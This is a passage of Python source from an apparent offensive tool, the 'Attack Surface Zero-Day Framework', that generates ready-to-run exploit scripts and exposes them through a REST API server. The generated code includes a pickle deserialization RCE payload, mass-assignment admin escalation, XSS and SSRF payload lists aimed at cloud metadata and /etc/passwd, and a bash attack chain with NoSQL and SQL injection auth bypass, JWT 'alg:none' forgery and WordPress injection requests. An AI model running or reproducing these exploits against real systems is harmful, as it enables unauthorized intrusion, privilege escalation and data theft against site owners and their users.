Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import base64
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

# Python pickle payload (calc.exe / id)
PICKLE_PAYLOAD = base64.b64encode(b"cos\\nsystem\\n(S'id'\\ntR.").decode()

# Java serialization magic bytes
JAVA_MAGIC = "rO0AB"  # Base64 of \\xac\\xed\\x00\\x05

def test_deserial():
    print(f"[*] Target: {{TARGET}}")
    
    endpoints = ["/api/data", "/api/import", "/deserialize"]
    
    for ep in endpoints:
        try:
            # Test pickle
            r = requests.post(f"{{TARGET}}{{ep}}", data=PICKLE_PAYLOAD, headers={{"Content-Type": "application/octet-stream"}}, timeout=10, verify=False)
            if "uid=" in r.text:
                print(f"[+] Pickle deserialization RCE!")
                return True
        except:
            pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] Deserial Found!" if test_deserial() else "[-] No Deserial")
'''
    (exploits_dir / "deserialization.py").write_text(deserial_exploit, encoding="utf-8")


def _gen_mass_assign_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate Mass Assignment exploit."""
    mass_exploit = f'''#!/usr/bin/env python3
"""Mass Assignment / IDOR Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

PAYLOADS = [
    {{"role": "admin"}},
    {{"isAdmin": True}},
    {{"admin": True}},
    {{"id": 1}},  # IDOR
    {{"user_id": 1}},
]

def test_mass_assign():
    print(f"[*] Target: {{TARGET}}")
    
    endpoints = ["/api/user", "/api/v1/user", "/api/profile", "/api/account"]
    
    for ep in endpoints:
        for payload in PAYLOADS:
            try:
                r = requests.patch(f"{{TARGET}}{{ep}}", json=payload, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json() if r.text else {{}}
                    if any(k in str(data) for k in ["admin", "role"]):
                        print(f"[+] Mass Assignment possible on {{ep}}!")
                        return True
            except:
                pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] Mass Assignment Found!" if test_mass_assign() else "[-] No MA")
'''
    (exploits_dir / "mass_assignment.py").write_text(mass_exploit, encoding="utf-8")


def _gen_xss_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate XSS exploit."""
    xss_exploit = f'''#!/usr/bin/env python3
"""Cross-Site Scripting (XSS) Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'><script>alert(1)</script>",
    "\\"onmouseover=alert(1)//",
]

def test_xss():
    print(f"[*] Target: {{TARGET}}")
    
    params = ["q", "search", "name", "id", "callback", "redirect"]
    
    for payload in PAYLOADS:
        for param in params:
            try:
                r = requests.get(TARGET, params={{param: payload}}, timeout=10, verify=False)
                if payload in r.text and "text/html" in r.headers.get("Content-Type", ""):
                    print(f"[+] Reflected XSS!")
                    print(f"    Parameter: {{param}}")
                    return True
            except:
                pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] XSS Found!" if test_xss() else "[-] No XSS")
'''
    (exploits_dir / "xss_exploit.py").write_text(xss_exploit, encoding="utf-8")


def _gen_ssrf_exploit(exploits_dir: Path, target_url: str) -> None:
    """Generate SSRF exploit."""
    ssrf_exploit = f'''#!/usr/bin/env python3
"""Server-Side Request Forgery (SSRF) Exploit
Target: {target_url}
Generated by Attack Surface Zero-Day Framework
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{target_url}"

PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",  # AWS
    "http://metadata.google.internal/",  # GCP
    "http://[::1]",
    "file:///etc/passwd",
]

def test_ssrf():
    print(f"[*] Target: {{TARGET}}")
    
    params = ["url", "uri", "path", "dest", "redirect", "site", "html", "data", "file"]
    
    for payload in PAYLOADS:
        for param in params:
            try:
                r = requests.get(TARGET, params={{param: payload}}, timeout=10, verify=False)
                if any(x in r.text for x in ["root:", "ami-id", "metadata", "instance"]):
                    print(f"[+] SSRF Confirmed!")
                    print(f"    Parameter: {{param}}")
                    print(f"    Payload: {{payload}}")
                    return True
            except:
                pass
    return False

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    print("[+] SSRF Found!" if test_ssrf() else "[-] No SSRF")
'''
    (exploits_dir / "ssrf_exploit.py").write_text(ssrf_exploit, encoding="utf-8")


def _gen_attack_chain(exploits_dir: Path, target_url: str, vuln_types: set) -> None:
    """Generate combined attack chain based on found vulnerabilities."""
    # Build phases based on found vulnerabilities
    phases = []
    
    if "nosql" in vuln_types or "sqli" in vuln_types:
        phases.append("auth_bypass")
    if "jwt" in vuln_types:
        phases.append("jwt_forge")
    if "wordpress" in vuln_types:
        phases.append("wordpress_cve")
    if "rce" in vuln_types or "ssti" in vuln_types:
        phases.append("rce")
    
    attack_chain = f'''#!/bin/bash
# Combined Zero-Day Attack Chain
# Target: {target_url}
# Vulnerabilities: {', '.join(sorted(vuln_types))}
# Generated by Attack Surface Zero-Day Framework

TARGET="${{1:-{target_url}}}"
echo "=========================================="
echo "Zero-Day Attack Chain"
echo "Target: $TARGET"
echo "Vulns: {', '.join(sorted(vuln_types))}"
echo "=========================================="

'''
    
    if "nosql" in vuln_types:
        attack_chain += '''
# Phase: NoSQL Injection Auth Bypass
echo "\\n[*] Phase: NoSQL Injection"
PAYLOADS=(
    '{"username":{"$gt":""}, "password":{"$gt":""}}'
    '{"username":{"$ne":null}, "password":{"$ne":null}}'
)

for payload in "${PAYLOADS[@]}"; do
    RESPONSE=$(curl -sk -X POST "$TARGET/api/v1/login" -H "Content-Type: application/json" -d "$payload")
    TOKEN=$(echo "$RESPONSE" | jq -r '.token // .access_token // empty' 2>/dev/null)
    if [ -n "$TOKEN" ]; then
        echo "[+] Got token: ${TOKEN:0:40}..."
        break
    fi
done
'''

    if "sqli" in vuln_types:
        attack_chain += '''
# Phase: SQL Injection
echo "\\n[*] Phase: SQL Injection"
curl -sk "$TARGET/?id=1' OR 1=1--" | head -c 500
'''

    if "jwt" in vuln_types:
        attack_chain += '''
# Phase: JWT Algorithm Confusion
echo "\\n[*] Phase: JWT Forge"
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=')
PAYLOAD=$(echo -n '{"user":"admin","role":"superuser"}' | base64 -w0 | tr -d '=')
TOKEN="${HEADER}.${PAYLOAD}."
curl -sk "$TARGET/api/admin" -H "Authorization: Bearer $TOKEN"
'''

    if "wordpress" in vuln_types:
        attack_chain += '''
# Phase: WordPress CVE-2026-60137/63030
echo "\\n[*] Phase: WordPress CVE"
curl -sk "$TARGET/wp-json/wp/v2/posts?author__not_in[0]=1) OR 1=1--" | head -c 500
curl -sk -X POST "$TARGET/wp-json/batch/v1" -H "Content-Type: application/json" -d '{"requests":[{"path":"/wp/v2/users","method":"GET"}]}'
'''

    attack_chain += '''
echo "\\n=========================================="
echo "Attack chain completed"
echo "=========================================="
'''
    
    (exploits_dir / "attack_chain.sh").write_text(attack_chain, encoding="utf-8")


# ============================================================================
# API Server Implementation
# ============================================================================

class AttackSurfaceAPIHandler(BaseHTTPRequestHandler):
    """REST API handler for Attack Surface framework."""
    
    def __init__(self, *args, orchestrator: ZeroDayOrchestrator = None, **kwargs):
        self.orchestrator = orchestrator or ZeroDayOrchestrator()
        super().__init__(*args, **kwargs)
    
    def _send_json_response(self, data: dict, status: int = 200) -> None:
        """Send JSON response."""
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2, ensure_ascii=False).encode("utf-8"))
    
    def _send_error_response(self, message: str, status: int = 400) -> None:
        """Send error response."""
        self._send_json_response({"error": message, "status": "error"}, status)
    
    def do_OPTIONS(self) -> None:
        """Handle CORS preflight."""
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
    
    def do_GET(self) -> None:
        """Handle GET requests."""
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == "/" or path == "/status":
            self._send_json_response({
                "status": "running",
                "name": "Attack Surface Zero-Day Framework",
                "version": "1.2.0",
                "endpoints": {
                    "GET /": "API status and info",
                    "GET /status": "API status and info",
                    "POST /scan": "Submit a security scan request",
                    "GET /help": "API usage documentation"
                }
            })
        elif path == "/help":
            self._send_json_response({
                "usage": {
                    "scan": {
                        "method": "POST",
                        "url": "/scan",
                        "body": {
                            "request": "(required) Security research request with target URL",
                            "verbose": "(optional) Show detailed output, default: false",
                            "debate": "(optional) Enable multi-agent debate, default: false",
                            "payload_mode": "(optional) quick|standard|thorough|aggressive, default: standard"
                        },
                        "example": {
                            "request": "Zero-day research https://example.com dengan izin tertulis",
                            "verbose": True,
                            "debate": True,
                            "payload_mode": "aggressive"
                        }
                    }
                }
            })
        else:
            self._send_error_response(f"Endpoint not found: {path}", 404)
    
    def do_POST(self) -> None:
        """Handle POST requests."""
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == "/scan":
            self._handle_scan()
        else:
            self._send_error_response(f"Endpoint not found: {path}", 404)
    
    def _handle_scan(self) -> None:
        """Handle /scan endpoint."""
        try:
            # Read request body
            content_length = int(self.headers.get("Content-Length", 0))
            if content_length == 0:
                self._send_error_response("Request body is required")
                return
            
            body = self.rfile.read(content_length).decode("utf-8")
            data = json.loads(body)
            
            # Extract parameters
            request_text = data.get("request")
            if not request_text:
                self._send_error_response("'request' field is required")
                return
            
            verbose = data.get("verbose", False)
            debate = data.get("debate", False)
            payload_mode = data.get("payload_mode", "standard")
            
            if payload_mode not in ["quick", "standard", "thorough", "aggressive"]:
                self._send_error_response(
                    f"Invalid payload_mode: {payload_mode}. "
                    "Must be: quick, standard, thorough, or aggressive"
                )
                return
            
            # Run the scan
            print(f"\n[API] Received scan request:")
            print(f"      Request: {request_text[:100]}...")
            print(f"      Mode: {payload_mode}, Verbose: {verbose}, Debate: {debate}")
            
            report = self.orchestrator.run(
                request_text,
                verbose=verbose,
                enable_debate=debate,
                payload_mode=payload_mode
            )
            
            # Build response
            response = {
                "status": report.status,
                "target": report.target,
                "summary": {
                    "total_findings": len(report.findings),
                    "validated": sum(1 for f in report.findings if f.validation_status == "validated"),
                    "critical": sum(1 for f in report.findings if f.severity == "critical"),
                    "high": sum(1 for f in report.findings if f.severity == "high"),
                    "medium": sum(1 for f in report.findings if f.severity == "medium"),
                    "low": sum(1 for f in report.findings if f.severity == "low"),
                },
                "findings": [
                    {
                        "id": f.id,
                        "title": f.title,
                        "severity": f.severity,
                        "vulnerability_class": f.vulnerability_class,
                        "attack_vector": f.attack_vector,
                        "validation_status": f.validation_status,
                        "false_positive_checks": list(f.false_positive_checks),
                        "payloads": [
                            {
                                "name": p.name,
                                "category": p.category,
                                "payload": p.payload,
                                "target_component": p.target_component,
                                "cve_reference": p.cve_reference,
                                "confidence": p.confidence
                            }
                            for p in f.payloads
                        ]
                    }
                    for f in report.findings
                ],
                "report": report.final
            }
            
            # Save findings if not refused
            if report.status != "refused":
                try:
                    output_dir = save_findings(report)
                    response["saved_to"] = str(output_dir)
                    print(f"[API] Findings saved to: {output_dir}")
                except Exception as e:
                    response["save_error"] = str(e)
            
            self._send_json_response(response)
            print(f"[API] Scan completed. Status: {report.status}, Findings: {len(report.findings)}")
            
        except json.JSONDecodeError:
            self._send_error_response("Invalid JSON in request body")
        except Exception as e:
            self._send_error_response(f"Scan error: {str(e)}", 500)
    
    def log_message(self, format: str, *args) -> None:
        """Custom log format."""
        print(f"[API] {self.address_string()} - {format % args}")


def run_api_server(port: int = 8080) -> None:
    """Run the API server."""
    orchestrator = ZeroDayOrchestrator()
    handler = partial(AttackSurfaceAPIHandler, orchestrator=orchestrator)
    
    server = HTTPServer(("0.0.0.0", port), handler)
    
    print(f"""
╔══════════════════════════════════════════════════════════════════╗
║       Attack Surface Zero-Day Framework - API Server             ║
╠══════════════════════════════════════════════════════════════════╣
║  Status:   RUNNING                                               ║
║  Port:     {port:<5}                                               ║
║  URL:      http://localhost:{port}                                 ║
╠══════════════════════════════════════════════════════════════════╣
║  Endpoints:                                                      ║
║    GET  /         - API status                                   ║
║    GET  /status   - API status                                   ║
║    GET  /help     - API documentation                            ║
║    POST /scan     - Submit security scan                         ║
╠══════════════════════════════════════════════════════════════════╣
║  Example:                                                        ║
║    curl -X POST http://localhost:{port}/scan \\                    ║
║      -H "Content-Type: application/json" \\                       ║
║      -d '{{"request": "Zero-day research https://target.com"}}'   ║
╚══════════════════════════════════════════════════════════════════╝
""")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[API] Server shutting down...")
        server.shutdown()


def main() -> None:
    parser = argparse.ArgumentParser(description="Zero-day security research framework.")
    parser.add_argument("request", nargs="?", help="Security research request to evaluate")
    parser.add_argument("--api", action="store_true", help="Run as REST API server")
    parser.add_argument("--port", type=int, default=8080, help="API server port (default: 8080)")
    parser.add_argument("--no-save", action="store_true", help="Don't save findings to disk")
    parser.add_argument("--verbose", "-v", action="store_true", help="Show detailed verification output")
    parser.add_argument("--debate", action="store_true", help="Enable multi-agent hypothesis debate system")
    parser.add_argument("--output", "-o", type=str, help="Custom output directory")
    parser.add_argument(
        "--payload-mode", "-p",
        type=str,
        choices=["quick", "standard", "thorough", "aggressive"],
        default="standard",
        help="Payload generation mode: quick (~300), standard (~700), thorough (~3700), aggressive (~5500+ with WAF)"
    )
    args = parser.parse_args()

    # API server mode
    if args.api:
        run_api_server(args.port)
        return

    # CLI mode requires a request
    if not args.request:
        parser.error("request is required in CLI mode (or use --api for server mode)")

    # Pass options to orchestrator
    report = ZeroDayOrchestrator().run(
        args.request,
        verbose=args.verbose,
        enable_debate=args.debate,
        payload_mode=args.payload_mode
    )
    print(report.final)
    
    # Save findings if not refused and not disabled
    if report.status != "refused" and not args.no_save:
        output_dir = save_findings(report)
        print(f"\n{'='*80}")
        print(f"[+] Findings saved to: {output_dir}")
        print(f"[+] Files generated:")
        for f in output_dir.iterdir():
            if f.is_file():
                print(f"    - {f.name}")
            elif f.is_dir():
                print(f"    - {f.name}/")
                for sf in f.iterdir():
                    print(f"        - {sf.name}")


if __name__ == "__main__":
    main()
